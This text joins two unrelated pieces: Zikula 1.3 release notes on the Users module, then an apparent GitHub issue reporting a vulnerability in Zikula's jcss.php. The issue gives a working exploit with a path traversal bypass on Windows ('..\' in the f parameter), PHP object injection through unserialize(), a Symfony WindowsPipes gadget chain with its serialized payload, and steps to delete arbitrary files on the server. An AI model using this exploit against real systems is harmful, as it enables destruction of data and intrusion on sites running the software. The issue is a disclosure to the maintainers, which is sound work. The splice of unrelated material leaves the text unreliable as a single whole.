## Users Module

There has been a significant overhaul of Users module:

* Admin can now resend a verification e-mail for a pending registration.
* Admin can now send a password reset e-mail to a user.
* Improved password recovery workflow. (#1631).
* Added user name recovery. (#243).
* Removed old Authentication API.
* Changed old password checker js sytem to "passwordchecker" library (#1841).
* Introduced new Authentication API capable of dealing with modern
  authentication (login) methods.
* The Users module configuration variable 'changepassword', which
  indicated that the Users module did not manage an account's password, has
  been deprecated. To provide alternate management, override the appropriate
  template(s) and/or function(s). To provide full authentication services,
  implement the Authentication API in a module.
* The mechanics of the authentication (login) process have changed, and
  the templates and functions have been updated accordingly. Templates that override the standard templates used for the login process will need to be
  updated, or removed.
* Added the ability to register a new account that is associated with an
  authentication method other than a username and password (Users module
  authentication).
* The mechanics of the registration process have changed, and the
  templates and functions have been updated accordingly. Templates that
  override the standard templates used for the login process will need to be
  updated, or removed.
* Several functions throughout the Users module have been either
  deprecated or removed entirely, in order to support the new log-in and
  registration paradigms. Customizations at the function level must be
  updated accordingly.
* Elements of the Legal module that were found in the Users module have
  been removed, and their functionality replaced with hooks or events. The
  age-check during registration has moved to the Legal module.
* Removed MD5 as a valid hash method for user passwords.
* Permission checks in the Users module were made more consistent
  throughout (#1872).
* All e-mail messages sent by the Users module can now be
  multi-part/alternative messages, containing both a plain-text version and
  an HTML version of the message. Templates for both are provided and
  automatically used if present.
* The subject line of all e-mail messages sent by the Users module can now be set from within the e-mail message template. See the templates provided for examples. If multi-part/alternative messages are to be sent, the subject from the HTML version of the message is used (however, the subject should not use HTML).
* The template file names for all e-mail messages sent from the Users
  module have changed. If a site upgrading from 1.2 has created custom
  templates for these messages, they should be converted to the new names,
  and the ability to send multi-part/alternative messages should be
  accounted for.
* If an attempt is made to log into an account that is pending
  registration (either because it is awaiting approval, or is awaiting
  verification, or both), the site admin can elect to display that status to
  the user in the error message on log-in failure.
* If an attempt is made to log into an account that is inactive (either
  because or is awaiting legacy activation, or because the admin set that
  activated state for the user), the site admin can elect to display that
  status to the user in the error message on log-in failure.
* The password recovery work flow has been improved to be clearer to the
  user.
* The new account registration process now collects a password reminder,
  and displays this reminder to the user as part of the password recovery
  process. For existing sites upgrading to 1.3, existing users will be asked
  for a password reminder when they change their password.
* The option to have the system generate a password and send it to a newly
  registering user has been removed as a verification option. Sites
  upgrading to 1.3 who have this option set will find this option changed to
  verification with a user-selected password.
* Except in one case, passwords are no longer sent via e-mail to newly
  registering users. The one exception is when an admin creates a user
  account, sets a password for that account himself, and specifically elects
  to send the password via e-mail.
* Confirmation or verification codes for registration verification,
  verification of change of e-mail address, and for password reset requests
  all now use the same mechanism and are handled consistently.
* Requests to change e-mail addresses that go unverified can be set to
  expire and be removed a specified number of days after the request is
  made.
* Requests to register a new account where e-mail address verification is required can be set to expire and be removed a specified number of days
  after the e-mail verification message is sent. Registrations whose e-mail
  verification expires will be removed from the system. Registrations
  awaiting approval will not expire until after they are approved.
* If the registration process is configured for both moderation (admin
  approval) and e-mail verification, then the order in which these occur can
  be set. Verification can be required before approval, after approval, or
  at any time before or after. The admin can override the order and cause
  one or the other process to occur at any time.
* Error checking of registration and user account fields has been improved and unified.
* All user names and e-mail addresses are now stored in (and thus
  displayed in) lower case.
* New user names are required to consist of only letters, numbers,
  underscores and periods. Accented and other non-ASCII characters are
  permitted as long as their Unicode type is set to the letter or digit
  group.
* When retrieving user accounts (for any purpose, including for logging
  in) by e-mail address, a duplicate e-mail address check is performed even
  if the Users module is set to require unique e-mail addresses. This is to
  prevent the wrong account from being returned if duplicate e-mail
  addresses were allowed at any point or were added by the administrator.
* A user with rights to delete user accounts is prevented from deleting
  his own account.
* The registration date, last login date, and all other dates saved to the database tables by the Users module are now guaranteed to be UTC
  date/times in the database. They might be adjusted for display by other
  functions, however.

[![@Xyntax](https://avatars.githubusercontent.com/u/12861404?u=247d1e91cd5cd60e46db0fd0e787a167cff8b455&v=4&size=48)](/Xyntax)[Xyntax](https://github.com/Xyntax)opened [on Dec 3, 2016](https://github.com/zikula/core/issues/3237#issue-193261502)

relative codes in `./jcss.php` :

```
$f = (isset($_GET['f']) ? filter_var($_GET['f'], FILTER_SANITIZE_STRING) : false);

if (!$f) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

// clean $f
$f = preg_replace('`/`', '', $f);

// set full path to the file
$f = $ZConfig['System']['temp'] . '/Theme_cache/' . $f;

if (!is_readable($f)) {
    header('HTTP/1.0 400 Bad request');
    die('ERROR: Requested file not readable.');
}

// child lock
$signingKey = md5(serialize($ZConfig['DBInfo']['databases']['default']));

$contents = file_get_contents($f);
if (!DataUtil::is_serialized($contents, false)) {
    header('HTTP/1.0 500 Internal error');
    die('ERROR: Corrupted file.');
}

$dataArray = unserialize($contents);

```

On windows platform we can bypass regex filter with `..\`

PoC: `http://localhost/zikula4/jcss.php?f=..\..\..\..\..\jcss.php`

the result of `file_get_contents()` was brought into `unserialize()`, when unserialize() is used on user supplied data it often leads to **PHP Object Injection**.

here we can launch further attacks with `__destruct()` in `./vendor/symfony/symfony/src/Symfony/Component/Process/Pipes/WindowsPipes.php`.

PoC: delete files on windows server.

Add a public func in class WindowsPipes:

```
public function setattr(){
		$this->files = array('D:\phpStudy\WWW\zikula4\userdata\delete.txt'); // file U wants to delete
		$this->fileHandles = array();
	}

```

Serialize an WindowsPipes object and write it to file:

```
$obj = new WindowsPipes(true,null);
$obj->setattr();
file_put_contents('./exp.txt',serialize($obj));

```

exp.txt

```
O:44:"Symfony\Component\Process\Pipes\WindowsPipes":8:{s:51:" Symfony\Component\Process\Pipes\WindowsPipes files";a:1:{i:0;s:21:".\userdata\delete.txt";}s:57:" Symfony\Component\Process\Pipes\WindowsPipes fileHandles";a:0:{}s:55:" Symfony\Component\Process\Pipes\WindowsPipes readBytes";a:2:{i:1;i:0;i:2;i:0;}s:59:" Symfony\Component\Process\Pipes\WindowsPipes disableOutput";b:1;s:5:"pipes";a:0:{}s:58:" Symfony\Component\Process\Pipes\AbstractPipes inputBuffer";s:0:"";s:52:" Symfony\Component\Process\Pipes\AbstractPipes input";N;s:54:" Symfony\Component\Process\Pipes\AbstractPipes blocked";b:1;}

```

Upload `exp.txt` to `./userdata` folder on windows server.

Then request `http://localhost/zikula4/jcss.php?f=..\..\..\..\..\userdata\exp.txt`, and your target file will be deleted. (`D:\phpStudy\WWW\zikula4\userdata\delete.txt` in my test).
